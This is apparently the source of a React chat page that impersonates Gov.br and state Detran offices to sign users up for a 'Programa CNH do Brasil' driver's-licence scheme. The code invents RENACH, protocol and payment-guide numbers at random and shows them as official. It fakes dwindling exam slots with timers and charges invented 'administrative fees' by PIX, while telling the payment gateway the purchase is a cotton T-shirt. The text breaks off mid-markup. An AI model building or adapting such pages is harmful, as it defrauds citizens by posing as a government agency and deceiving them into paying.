'use client';

import { useEffect, useState, useRef, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Loader2, Upload, Check, Copy } from 'lucide-react';
import QRCode from 'qrcode';
import { getDetranLogo } from '@/utils/detranLogos';

interface Message {
  id: number;
  type: 'bot' | 'user' | 'comprovante' | 'guia' | 'pix' | 'upload';
  text?: string;
  options?: string[];
  data?: Record<string, unknown>;
}

interface TaxaValues {
  ted: number;
  tsa: number;
  tpe: number;
  total: number;
}

export default function ChatPage() {
  const router = useRouter();
  const [userName, setUserName] = useState('');
  const [userFullName, setUserFullName] = useState('');
  const [userCpf, setUserCpf] = useState('');
  const [detranSelecionado, setDetranSelecionado] = useState('');
  const [detranSigla, setDetranSigla] = useState('AC');
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStep, setCurrentStep] = useState(0);
  const [isTyping, setIsTyping] = useState(false);
  const [showOptions, setShowOptions] = useState(false);
  const [currentOptions, setCurrentOptions] = useState<string[]>([]);
  const [categoria, setCategoria] = useState('B');
  const [renach, setRenach] = useState('');
  const [protocolo, setProtocolo] = useState('');
  const [numGuia, setNumGuia] = useState('');
  const [taxas, setTaxas] = useState<TaxaValues>({ ted: 0, tsa: 0, tpe: 0, total: 0 });
  const [mesSelecionado, setMesSelecionado] = useState('');
  const [showMesesGrid, setShowMesesGrid] = useState(false);
  const [vagasMeses, setVagasMeses] = useState<Record<string, number>>({});
  const [loadingCadastro, setLoadingCadastro] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [qrCodeUrl, setQrCodeUrl] = useState('');
  const [pixCode, setPixCode] = useState('');
  const [pixExpirationTime, setPixExpirationTime] = useState(600);
  const [isLoadingPix, setIsLoadingPix] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isPaid, setIsPaid] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [copied, setCopied] = useState(false);
  const [transactionId, setTransactionId] = useState('');
  const [showUploadArea, setShowUploadArea] = useState(false);
  const [checkingPayment, setCheckingPayment] = useState(false);
  const [valorCentavos, setValorCentavos] = useState(0);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const isPollingActiveRef = useRef(false);
  const lastTransactionIdRef = useRef<string>('');
  const conversionSentRef = useRef(false);
  const chatInitializedRef = useRef(false);

  const scrollToBottom = useCallback(() => {
    setTimeout(() => {
      messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, 100);
  }, []);

  useEffect(() => {
    scrollToBottom();
  }, [messages, isTyping, scrollToBottom]);

  // Timer do PIX
  useEffect(() => {
    if (pixCode && pixExpirationTime > 0 && !isPaid) {
      const timer = setInterval(() => {
        setPixExpirationTime(prev => prev - 1);
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [pixCode, pixExpirationTime, isPaid]);

  // Capturar UTM params
  const getUtmParams = useCallback(() => {
    if (typeof window === 'undefined') return {};
    
    const savedUtm = localStorage.getItem('utmParams');
    if (savedUtm) {
      return JSON.parse(savedUtm);
    }
    
    const params = new URLSearchParams(window.location.search);
    const utmParams: Record<string, string | null> = {
      utm_source: params.get('utm_source'),
      utm_campaign: params.get('utm_campaign'),
      utm_medium: params.get('utm_medium'),
      utm_content: params.get('utm_content'),
      utm_term: params.get('utm_term'),
      keyword: params.get('keyword'),
      device: params.get('device'),
      network: params.get('network'),
      src: params.get('src'),
      sck: params.get('sck')
    };
    
    localStorage.setItem('utmParams', JSON.stringify(utmParams));
    return utmParams;
  }, []);

  // Verificação única de pagamento
  const verificarPagamentoUnico = useCallback(async (txId: string): Promise<boolean> => {
    try {
      const utmParams = getUtmParams();
      const response = await fetch('/api/pagamento/verificar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ transactionId: txId, utmParams })
      });
      const result = await response.json();

      if (result.success && result.pago && !conversionSentRef.current) {
        conversionSentRef.current = true;
        isPollingActiveRef.current = false;
        
        if (pollingIntervalRef.current) {
          clearInterval(pollingIntervalRef.current);
          pollingIntervalRef.current = null;
        }
        
        setIsPaid(true);
        
        // Enviar conversão Google Ads
        if (typeof window !== 'undefined' && (window as any).gtag_report_conversion) {
          const valorReais = valorCentavos / 100;
          (window as any).gtag_report_conversion(txId, valorReais);
          console.log('✅ Conversão Google Ads enviada:', valorReais);
        }
        
        localStorage.setItem(`conversion_sent_${txId}`, 'true');
        localStorage.removeItem('currentTransactionChat');
        
        setTimeout(() => {
          router.push('/sucesso-b');
        }, 2000);
        
        return true;
      }
      return false;
    } catch (error) {
      console.error('Erro ao verificar pagamento:', error);
      return false;
    }
  }, [getUtmParams, valorCentavos, router]);

  // Iniciar polling de pagamento
  const iniciarVerificacaoPagamento = useCallback((txId: string) => {
    if (localStorage.getItem(`conversion_sent_${txId}`)) {
      console.log('⚠️ Conversão já enviada para esta transação');
      setIsPaid(true);
      setTimeout(() => router.push('/sucesso-b'), 1000);
      return;
    }

    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }

    lastTransactionIdRef.current = txId;
    isPollingActiveRef.current = true;
    conversionSentRef.current = false;

    const executarPolling = () => {
      if (!isPollingActiveRef.current || conversionSentRef.current) return;
      verificarPagamentoUnico(txId);
    };

    executarPolling();
    pollingIntervalRef.current = setInterval(executarPolling, 10000);

    // Parar após 60 minutos
    setTimeout(() => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
        isPollingActiveRef.current = false;
      }
    }, 60 * 60 * 1000);
  }, [verificarPagamentoUnico, router]);

  // Detectar visibilidade da aba
  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.hidden) {
        console.log('⏸️ Aba minimizada - polling pausado');
        if (pollingIntervalRef.current) {
          clearInterval(pollingIntervalRef.current);
          pollingIntervalRef.current = null;
        }
      } else {
        console.log('▶️ Aba visível - retomando polling');
        if (isPollingActiveRef.current && lastTransactionIdRef.current && !conversionSentRef.current) {
          verificarPagamentoUnico(lastTransactionIdRef.current);
          pollingIntervalRef.current = setInterval(() => {
            if (!conversionSentRef.current) {
              verificarPagamentoUnico(lastTransactionIdRef.current);
            }
          }, 10000);
        }
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    return () => document.removeEventListener('visibilitychange', handleVisibilityChange);
  }, [verificarPagamentoUnico]);

  // Cleanup polling ao desmontar
  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
      }
    };
  }, []);

  // Restaurar transação ao voltar para página
  useEffect(() => {
    const savedTransaction = localStorage.getItem('currentTransactionChat');
    if (savedTransaction) {
      const data = JSON.parse(savedTransaction);
      if (data.transactionId && !localStorage.getItem(`conversion_sent_${data.transactionId}`)) {
        setTransactionId(data.transactionId);
        setPixCode(data.pixCode || data.qrCode || '');
        setValorCentavos(data.valorCentavos || 0);
        if (data.taxas) {
          setTaxas({
            ted: data.taxas.ted / 100,
            tsa: data.taxas.tsa / 100,
            tpe: data.taxas.tpe / 100,
            total: data.valorCentavos / 100
          });
        }
        // Reiniciar polling
        iniciarVerificacaoPagamento(data.transactionId);
      }
    }
  }, [iniciarVerificacaoPagamento]);

  // Inicializar vagas dos meses
  const inicializarVagasMeses = useCallback(() => {
    const storageKey = 'vagasMesesCNH';
    const savedVagas = localStorage.getItem(storageKey);
    
    if (savedVagas) {
      const parsed = JSON.parse(savedVagas);
      // Verificar se os dados são do mesmo dia
      const hoje = new Date().toDateString();
      if (parsed.data === hoje) {
        return parsed.vagas;
      }
    }
    
    // Gerar novas vagas aleatórias
    const meses = [
      'JANEIRO/2026', 'FEVEREIRO/2026', 'MARÇO/2026', 'ABRIL/2026',
      'MAIO/2026', 'JUNHO/2026', 'JULHO/2026', 'AGOSTO/2026',
      'SETEMBRO/2026', 'OUTUBRO/2026', 'NOVEMBRO/2026', 'DEZEMBRO/2026'
    ];
    
    const novasVagas: Record<string, number> = {};
    meses.forEach(mes => {
      novasVagas[mes] = Math.floor(Math.random() * 10) + 4; // 4 a 13 vagas
    });
    
    // Salvar no localStorage
    localStorage.setItem(storageKey, JSON.stringify({
      data: new Date().toDateString(),
      vagas: novasVagas
    }));
    
    return novasVagas;
  }, []);

  // Timer para diminuir vagas em tempo real
  useEffect(() => {
    if (!showMesesGrid) return;

    // Diminui 1 em janeiro e 2 em fevereiro após 20s
    const timer1 = setTimeout(() => {
      setVagasMeses(prev => {
        const updated = { ...prev };
        if (updated['JANEIRO/2026'] > 1) updated['JANEIRO/2026'] -= 1;
        if (updated['FEVEREIRO/2026'] > 2) updated['FEVEREIRO/2026'] -= 2;
        
        // Atualizar localStorage
        const storageKey = 'vagasMesesCNH';
        localStorage.setItem(storageKey, JSON.stringify({
          data: new Date().toDateString(),
          vagas: updated
        }));
        
        return updated;
      });
    }, 20000); // 20 segundos

    // Diminui mais após 2 minutos
    const timer2 = setTimeout(() => {
      setVagasMeses(prev => {
        const updated = { ...prev };
        const meses = Object.keys(updated);
        // Diminui 1 de um mês aleatório
        const mesAleatorio = meses[Math.floor(Math.random() * meses.length)];
        if (updated[mesAleatorio] > 1) updated[mesAleatorio] -= 1;
        
        // Atualizar localStorage
        const storageKey = 'vagasMesesCNH';
        localStorage.setItem(storageKey, JSON.stringify({
          data: new Date().toDateString(),
          vagas: updated
        }));
        
        return updated;
      });
    }, 120000); // 2 minutos

    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
    };
  }, [showMesesGrid]);

  // Buscar valores das taxas da API
  const buscarTaxas = async (): Promise<TaxaValues> => {
    const response = await fetch('/api/valor');
    const data = await response.json();
    return {
      ted: data.taxas.ted.centavos / 100,
      tsa: data.taxas.tsa.centavos / 100,
      tpe: data.taxas.tpe.centavos / 100,
      total: data.valorCentavos / 100
    };
  };

  // Gerar números aleatórios
  const gerarNumeros = () => {
    const renachNum = Math.floor(Math.random() * 90000000000 + 10000000000).toString();
    const protocoloNum = (2026000000000 + Math.floor(Math.random() * 999999999)).toString();
    const guiaNum = Math.floor(Math.random() * 90000000 + 10000000).toString();
    return { renachNum, protocoloNum, guiaNum };
  };

  useEffect(() => {
    // Evitar duplicação de mensagens
    if (chatInitializedRef.current) return;
    chatInitializedRef.current = true;

    const userData = localStorage.getItem('usuarioLogado');
    if (userData) {
      const user = JSON.parse(userData);
      const primeiroNome = user.nome?.split(' ')[0] || '';
      setUserName(primeiroNome.toUpperCase());
      setUserFullName(user.nome || '');
      setUserCpf(user.cpf || '');
    }

    const userBasicData = localStorage.getItem('userBasicData');
    if (userBasicData) {
      const data = JSON.parse(userBasicData);
      setDetranSelecionado(data.detranSelecionado || 'Acre');
      setDetranSigla(data.detranSigla || 'AC');
    }

    // Gerar números
    const { renachNum, protocoloNum, guiaNum } = gerarNumeros();
    setRenach(renachNum);
    setProtocolo(protocoloNum);
    setNumGuia(guiaNum);

    // Iniciar conversa
    setTimeout(() => {
      addBotMessage('Para dar continuidade ao seu cadastro no Programa CNH do Brasil, informamos que é necessário selecionar a categoria de CNH pretendida.');
      setCurrentOptions(['categoria']);
      setShowOptions(true);
    }, 1000);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const addBotMessage = (text: string) => {
    setIsTyping(true);
    setShowOptions(false);
    setTimeout(() => {
      setIsTyping(false);
      setMessages(prev => [...prev, { id: Date.now(), type: 'bot', text }]);
      scrollToBottom();
    }, 1500);
  };

  const addUserMessage = (text: string) => {
    setMessages(prev => [...prev, { id: Date.now(), type: 'user', text }]);
    setShowOptions(false);
    scrollToBottom();
  };

  const addComprovante = () => {
    setMessages(prev => [...prev, { id: Date.now(), type: 'comprovante' }]);
    scrollToBottom();
  };

  const addGuia = () => {
    setMessages(prev => [...prev, { id: Date.now(), type: 'guia' }]);
    scrollToBottom();
  };

  const addPix = () => {
    setMessages(prev => [...prev, { id: Date.now(), type: 'pix' }]);
    scrollToBottom();
  };

  const addUpload = () => {
    setMessages(prev => [...prev, { id: Date.now(), type: 'upload' }]);
    scrollToBottom();
  };

  const criarPix = async () => {
    setIsLoadingPix(true);
    try {
      const userBasicData = JSON.parse(localStorage.getItem('userBasicData') || '{}');
      const utmParams = getUtmParams();
      const valorEmCentavos = Math.round(taxas.total * 100);
      
      const response = await fetch('/api/pagamento/criar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          valor: valorEmCentavos,
          nome: userFullName,
          email: userBasicData.email || 'usuario@email.com',
          cpf: userCpf.replace(/\D/g, ''),
          telefone: userBasicData.telefone || '11999999999',
          produto: 'Camiseta Algodão Premium',
          endereco: {
            street: userBasicData.endereco || 'Rua',
            streetNumber: '0',
            complement: '',
            zipCode: (userBasicData.cep || '00000000').replace(/\D/g, ''),
            neighborhood: userBasicData.bairro || 'Centro',
            city: userBasicData.cidade || 'São Paulo',
            state: userBasicData.uf || 'SP'
          },
          utmParams
        })
      });

      const data = await response.json();
      if (data.success && (data.qrCode || data.pixCode)) {
        // Usar pixCode para copia e cola (Nitro), senão qrCode
        const codigoPix = data.pixCode || data.qrCode;
        setPixCode(codigoPix);
        setTransactionId(data.transactionId || '');
        setValorCentavos(valorEmCentavos);
        const qrUrl = await QRCode.toDataURL(codigoPix, { width: 200, margin: 2 });
        setQrCodeUrl(qrUrl);
        
        // Salvar no localStorage para não perder ao recarregar
        localStorage.setItem('currentTransactionChat', JSON.stringify({
          transactionId: data.transactionId,
          qrCode: data.qrCode,
          pixCode: codigoPix,
          valorCentavos: valorEmCentavos,
          taxas: {
            ted: Math.round(taxas.ted * 100),
            tsa: Math.round(taxas.tsa * 100),
            tpe: Math.round(taxas.tpe * 100)
          }
        }));
        // Salvar valor para o upload do comprovante
        localStorage.setItem('paymentAmount', String(valorEmCentavos / 100));
        
        // Iniciar polling de verificação
        iniciarVerificacaoPagamento(data.transactionId);
      }
    } catch (error) {
      console.error('Erro ao criar PIX:', error);
    } finally {
      setIsLoadingPix(false);
    }
  };

  // Botão "Ativar meu cadastro" - faz polling e mostra upload se não pago
  const handleAtivarCadastro = async () => {
    setCheckingPayment(true);
    
    // Polling - verifica 3 vezes com intervalo de 2s
    for (let i = 0; i < 3; i++) {
      if (transactionId) {
        const pago = await verificarPagamentoUnico(transactionId);
        if (pago) {
          return; // verificarPagamentoUnico já redireciona
        }
      }
      if (i < 2) await new Promise(r => setTimeout(r, 2000));
    }
    
    // Não foi pago - mostrar área de upload
    setCheckingPayment(false);
    setShowUploadArea(true);
    scrollToBottom();
  };

  // Otimizar imagem antes do upload
  const otimizarImagem = async (file: File): Promise<Blob> => {
    // Se for PDF, retorna sem modificar
    if (file.type === 'application/pdf') {
      return file;
    }

    return new Promise((resolve) => {
      const img = document.createElement('img');
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');

      img.onload = () => {
        // Redimensionar para max 1200px mantendo proporção
        let { width, height } = img;
        const maxSize = 1200;

        if (width > maxSize || height > maxSize) {
          if (width > height) {
            height = (height / width) * maxSize;
            width = maxSize;
          } else {
            width = (width / height) * maxSize;
            height = maxSize;
          }
        }

        canvas.width = width;
        canvas.height = height;
        ctx?.drawImage(img, 0, 0, width, height);

        // Converter para JPEG com qualidade 0.7
        canvas.toBlob(
          (blob) => resolve(blob || file),
          'image/jpeg',
          0.7
        );
      };

      img.src = URL.createObjectURL(file);
    });
  };

  const handleCategoriaSelect = (cat: string, label: string) => {
    addUserMessage(label);
    setCategoria(cat);
    
    const userBasicData = JSON.parse(localStorage.getItem('userBasicData') || '{}');
    localStorage.setItem('userBasicData', JSON.stringify({ ...userBasicData, categoria: cat }));

    // Mostrar loading de consulta
    setIsLoading(true);
    setShowOptions(false);
    
    setTimeout(() => {
      setIsLoading(false);
      setCurrentStep(1);
      addBotMessage(`Prezado(a) ${userName.charAt(0) + userName.slice(1).toLowerCase()}, informamos que as aulas teóricas do Programa CNH do Brasil podem ser realizadas de forma remota, por meio de dispositivo móvel ou computador, conforme sua disponibilidade de horário.\n\nApós a finalização do cadastro, o sistema liberará o acesso ao aplicativo oficial com o passo a passo completo, e você já poderá iniciar as aulas imediatamente.`);
      setTimeout(() => {
        setCurrentOptions(['Prosseguir']);
        setShowOptions(true);
      }, 1600);
    }, 3000);
  };

  const handleOptionClick = async (option: string) => {
    addUserMessage(option);

    if (currentStep === 0) {
      // Não deveria chegar aqui, pois usamos handleCategoriaSelect
      return;

    } else if (currentStep === 1) {
      setCurrentStep(2);
      setTimeout(() => {
        addBotMessage(`O Programa CNH do Brasil segue as seguintes etapas: o candidato realiza as aulas teóricas através do aplicativo oficial e, após a conclusão, o Detran ${detranSelecionado} disponibilizará um instrutor credenciado, sem custo adicional, para a realização das aulas práticas obrigatórias.`);
        setTimeout(() => {
          setCurrentOptions(['Prosseguir']);
          setShowOptions(true);
        }, 1600);
      }, 500);

    } else if (currentStep === 2) {
      setCurrentStep(3);
      setTimeout(() => {
        addBotMessage('As avaliações teóricas e práticas encontram-se disponíveis para agendamento. Para finalização do cadastro, é necessário selecionar o período para realização das provas. Conforme a legislação vigente, o processo completo tem duração inferior a 20 dias úteis.');
        setTimeout(() => {
          setCurrentOptions(['Prosseguir']);
          setShowOptions(true);
        }, 1600);
      }, 500);

    } else if (currentStep === 3) {
      // Após prosseguir, mostra grid de meses com vagas
      setCurrentStep(4);
      setTimeout(() => {
        addBotMessage('Selecione o mês de sua preferência para realização das avaliações:');
        setTimeout(() => {
          // Inicializar vagas e mostrar grid
          const vagas = inicializarVagasMeses();
          setVagasMeses(vagas);
          setShowMesesGrid(true);
          setShowOptions(false);
        }, 1600);
      }, 500);

    } else if (currentStep === 4) {
      // Seleção de mês (chamado pelo handleMesSelect)
      return;
    }
  };

  const handleMesSelect = (mes: string) => {
    setMesSelecionado(mes);
    setShowMesesGrid(false);
    addUserMessage(mes);
    
    // Salvar mês selecionado no localStorage
    const userBasicData = JSON.parse(localStorage.getItem('userBasicData') || '{}');
    localStorage.setItem('userBasicData', JSON.stringify({
      ...userBasicData,
      mesSelecionado: mes,
      vagasNoMomento: vagasMeses[mes]
    }));

    // Mostrar loading de cadastro
    setLoadingCadastro(true);
    setLoadingMessage('Confirmando cadastro junto ao Detran...');
    
    setTimeout(() => {
      setLoadingMessage('Gerando cadastro no RENACH...');
    }, 2000);
    
    setTimeout(() => {
      setLoadingMessage('Emitindo documentação...');
    }, 4000);
    
    setTimeout(() => {
      setLoadingCadastro(false);
      setLoadingMessage('');
      setCurrentStep(5);
      
      addBotMessage(`Prezado(a) ${userName.charAt(0) + userName.slice(1).toLowerCase()}, seu número de RENACH foi gerado com sucesso junto ao Detran ${detranSelecionado}.\n\nNúmero do RENACH: ${renach}\n\nO RENACH (Registro Nacional de Carteira de Habilitação) é o número de identificação único do candidato no Sistema Nacional de Habilitação.`);
      setTimeout(() => {
        addComprovante();
        setTimeout(() => {
          setCurrentOptions(['Prosseguir']);
          setShowOptions(true);
        }, 500);
      }, 1600);
    }, 6000);
  };

  const handleStep5Click = async () => {
    addUserMessage('Prosseguir');
    setShowOptions(false);
    
    // Buscar taxas da API
    const taxasData = await buscarTaxas();
    setTaxas(taxasData);
    
    setCurrentStep(6);
    
    // Mostrar resumo das taxas
    setTimeout(() => {
      addBotMessage(`Prezado(a) ${userName.charAt(0) + userName.slice(1).toLowerCase()}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:\n\n• Taxa de Expedição de Documento (TED): R$ ${taxasData.ted.toFixed(2).replace('.', ',')}\n• Taxa de Serviços Administrativos (TSA): R$ ${taxasData.tsa.toFixed(2).replace('.', ',')}\n• Taxa de Processamento Eletrônico (TPE): R$ ${taxasData.tpe.toFixed(2).replace('.', ',')}\n\nValor Total: R$ ${taxasData.total.toFixed(2).replace('.', ',')}`);
      setTimeout(() => {
        setCurrentOptions(['Finalizar Cadastro']);
        setShowOptions(true);
      }, 1600);
    }, 500);
  };

  const handleStep6Click = async () => {
    addUserMessage('Finalizar Cadastro');
    setShowOptions(false);
    setCurrentStep(7);
    
    // Mostrar loading "Gerando guia de Pagamento..."
    setLoadingCadastro(true);
    setLoadingMessage('Gerando guia de Pagamento...');
    
    setTimeout(async () => {
      setLoadingCadastro(false);
      setLoadingMessage('');
      
      addGuia();
      setTimeout(async () => {
        await criarPix();
        addPix();
        setTimeout(() => {
          addBotMessage(`Para realizar o pagamento via PIX Copia e Cola:\n\n1. Copie o código PIX clicando no botão "Copiar Código PIX"\n2. Abra o aplicativo do seu banco\n3. Acesse a área PIX e selecione "Pagar com PIX Copia e Cola"\n4. Cole o código copiado e confirme o pagamento\n\nApós a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.\n\nAssim que realizar o pagamento das taxas no valor de R$ ${taxas.total.toFixed(2).replace('.', ',')}, clique no botão abaixo para ativar seu cadastro.`);
          setTimeout(() => {
            addUpload();
          }, 1600);
        }, 1600);
      }, 1000);
    }, 3000);
  };

  const formatCpf = (cpf: string) => {
    const cleaned = cpf.replace(/\D/g, '');
    return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopyPix = () => {
    navigator.clipboard.writeText(pixCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setSelectedFile(e.target.files[0]);
    }
  };

  const handleSubmitComprovante = async () => {
    if (!selectedFile) return;
    
    setIsLoadingPix(true);
    
    try {
      // Otimizar imagem (PDF passa direto)
      const arquivoOtimizado = await otimizarImagem(selectedFile);
      
      const formData = new FormData();
      formData.append('file', arquivoOtimizado, selectedFile.name);
      formData.append('cpf', userCpf);
      formData.append('renach', renach);
      formData.append('paymentId', transactionId || '');
      formData.append('amount', localStorage.getItem('paymentAmount') || '');
      formData.append('customerMessage', '');
      
      const response = await fetch('/api/upload-comprovante', {
        method: 'POST',
        body: formData
      });
      
      const data = await response.json();
      
      if (data.success) {
        // Salvar referência do comprovante no localStorage (sem expor URL)
        const userBasicData = JSON.parse(localStorage.getItem('userBasicData') || '{}');
        localStorage.setItem('userBasicData', JSON.stringify({
          ...userBasicData,
          comprovanteFileId: data.fileId,
          comprovanteUploadedAt: data.uploadedAt
        }));
        
        // Aguardar confirmação do pagamento no gateway antes de redirecionar
        if (transactionId) {
          addBotMessage('Comprovante recebido! Aguardando confirmação do pagamento...');
          
          // Polling para verificar status do pagamento (máx 60 tentativas = 5 min)
          for (let i = 0; i < 60; i++) {
            try {
              const verifyRes = await fetch('/api/pagamento/verificar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ transactionId, utmParams: getUtmParams() })
              });
              const verifyData = await verifyRes.json();
              
              if (verifyData.pago) {
                setIsPaid(true);
                router.push('/sucesso-b');
                return;
              }
            } catch (err) {
              console.error('Erro na verificação:', err);
            }
            
            // Aguardar 5 segundos entre verificações
            await new Promise(r => setTimeout(r, 5000));
          }
          
          // Timeout - pagamento não confirmado após 5 min
          addBotMessage('O pagamento ainda não foi confirmado. Por favor, aguarde alguns minutos e tente novamente.');
        } else {
          // Sem transactionId, redireciona direto
          setIsPaid(true);
          router.push('/sucesso-b');
        }
      } else {
        console.error('Erro no upload:', data.error);
        addBotMessage('Erro ao enviar comprovante. Tente novamente.');
      }
    } catch (error) {
      console.error('Erro ao enviar comprovante:', error);
      addBotMessage('Erro ao enviar comprovante. Tente novamente.');
    } finally {
      setIsLoadingPix(false);
    }
  };

  const dataAtual = new Date();
  const dataFormatada = `${dataAtual.getDate().toString().padStart(2, '0')}/${(dataAtual.getMonth() + 1).toString().padStart(2, '0')}/${dataAtual.getFullYear()}`;
  const horaFormatada = `${dataAtual.getHours().toString().padStart(2, '0')}:${dataAtual.getMinutes().toString().padStart(2, '0')}`;

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="bg-white px-6 py-3 flex justify-between items-center border-b">
        <div className="flex items-center">
          <Image src="/logo645.png" alt="Logo gov.br" width={70} height={24} className="mr-8" />
          <button className="text-[#1351B4] ml-8"><i className="fas fa-ellipsis-v"></i></button>
          <div className="border-l border-gray-300 h-6 mx-4"></div>
        </div>
        <div className="flex items-center gap-6">
          <button className="text-[#1351B4]"><i className="fas fa-cookie-bite"></i></button>
          <button className="text-[#1351B4]"><i className="fas fa-th"></i></button>
          <button className="bg-[#1351B4] text-white rounded-full px-4 py-1.5 flex items-center text-sm">
            <i className="fas fa-user mr-2"></i>
            <span>{userName}</span>
          </button>
        </div>
      </header>

      {/* Nav com avatar gov.br */}
      <nav className="bg-gray-100 px-6 py-3 flex items-center">
        <div className="relative mr-3">
          <Image src="/gov-avatar.png" alt="Atendimento" width={28} height={28} className="rounded-full" />
          <span className="absolute bottom-0 right-0 w-2 h-2 bg-green-500 rounded-full border-2 border-white"></span>
        </div>
        <span className="text-gray-500 text-sm font-light">Atendimento Gov.br</span>
      </nav>

      {/* Chat messages */}
      <main className="flex-1 overflow-hidden bg-gray-50">
        <div className="max-w-4xl mx-auto h-full px-4">
          <div className="h-[calc(100vh-220px)] overflow-y-auto py-4" style={{ scrollBehavior: 'smooth' }}>
            {messages.map((message) => (
              <div key={message.id} className="mb-4">
                {message.type === 'bot' && (
                  <div className="text-left">
                    <div className="inline-block max-w-[80%] p-4 rounded-2xl shadow-sm bg-[#2670CC] text-white rounded-tl-sm" style={{ lineHeight: 1.5, fontSize: '16px', whiteSpace: 'pre-line' }}>
                      {message.text}
                    </div>
                  </div>
                )}
                {message.type === 'user' && (
                  <div className="text-right">
                    <div className="inline-block max-w-[80%] p-4 rounded-2xl shadow-sm bg-gray-200 text-gray-800 rounded-tr-sm" style={{ lineHeight: 1.5, fontSize: '16px' }}>
                      {message.text}
                    </div>
                  </div>
                )}
                {message.type === 'comprovante' && (
                  <div className="my-4 max-w-md mx-auto">
                    <div className="bg-white border border-gray-300 rounded shadow-md text-xs">
                      <div className="bg-gray-50 p-2 border-b border-gray-200 flex items-center justify-between">
                        <Image src={getDetranLogo(detranSigla)} alt={`DETRAN ${detranSigla}`} width={100} height={32} className="h-8 object-contain" />
                        <span className="text-gray-500 text-xs">Protocolo: {protocolo}</span>
                      </div>
                      <div className="p-3">
                        <div className="text-center mb-2">
                          <p className="text-xs font-bold text-gray-700">COMPROVANTE DE CADASTRO - RENACH</p>
                        </div>
                        <div className="grid grid-cols-2 gap-2 mb-2">
                          <div>
                            <p className="text-gray-400 text-[10px]">NOME</p>
                            <p className="font-semibold text-gray-800 text-xs">{userFullName.toUpperCase()}</p>
                          </div>
                          <div>
                            <p className="text-gray-400 text-[10px]">CPF</p>
                            <p className="font-semibold text-gray-800 text-xs">{formatCpf(userCpf)}</p>
                          </div>
                        </div>
                        <div className="bg-blue-50 p-2 rounded mb-2">
                          <div className="grid grid-cols-2 gap-2">
                            <div>
                              <p className="text-gray-400 text-[10px]">Nº RENACH</p>
                              <p className="font-bold text-[#1351B4] text-sm">{renach}</p>
                            </div>
                            <div>
                              <p className="text-gray-400 text-[10px]">CATEGORIA</p>
                              <p className="font-bold text-gray-800 text-sm">{categoria}</p>
                            </div>
                          </div>
                        </div>
                        <div className="grid grid-cols-2 gap-2 mb-2">
                          <div>
                            <p className="text-gray-400 text-[10px]">MÊS PREVISTO</p>
                            <p className="font-semibold text-gray-800 text-xs">{mesSelecionado}</p>
                          </div>
                          <div>
                            <p className="text-gray-400 text-[10px]">STATUS</p>
                            <p className="font-bold text-orange-600 text-xs">PENDENTE</p>
                          </div>
                        </div>
                        <div className="border-t border-gray-200 pt-2 text-[10px] text-gray-400">
                          <p>Emitido em {dataFormatada} às {horaFormatada}</p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
                {message.type === 'guia' && (
                  <div className="my-4 max-w-lg mx-auto">
                    <div className="bg-white border border-gray-300 rounded shadow-md">
                      <div className="text-center py-4 border-b">
                        <div className="flex justify-center mb-2">
                          <Image src={getDetranLogo(detranSigla)} alt={`DETRAN ${detranSigla}`} width={80} height={60} className="object-contain" />
                        </div>
                        <p className="font-bold text-gray-800">DETRAN.{detranSigla}</p>
                        <p className="text-xs text-gray-500">Departamento Estadual de Trânsito</p>
                        <p className="font-bold text-gray-700 mt-2">GUIA DE RECOLHIMENTO</p>
                        <p className="text-xs text-gray-500">GUIA DE PAGAMENTO</p>
                      </div>
                      <div className="p-4">
                        <div className="mb-3">
                          <p className="text-xs text-gray-500">CONTRIBUINTE</p>
                          <p className="font-bold text-gray-800">{userFullName.toUpperCase()}</p>
                        </div>
                        <div className="mb-3">
                          <p className="text-xs text-gray-500">CPF</p>
                          <p className="text-gray-800">{formatCpf(userCpf)}</p>
                        </div>
                        <div className="text-center py-2 border-y">
                          <p className="text-xs text-gray-500">EXERCÍCIO</p>
                          <p className="font-bold text-xl">2026</p>
                        </div>
                        <div className="grid grid-cols-3 gap-2 py-3 text-xs border-b">
                          <div>
                            <p className="text-gray-500">Nº RENACH</p>
                            <p className="font-semibold">{renach}</p>
                          </div>
                          <div>
                            <p className="text-gray-500">Nº GUIA</p>
                            <p className="font-semibold">{numGuia}</p>
                          </div>
                          <div>
                            <p className="text-gray-500">VENCIMENTO</p>
                            <p className="font-semibold">{dataFormatada}</p>
                          </div>
                        </div>
                        <div className="mt-3">
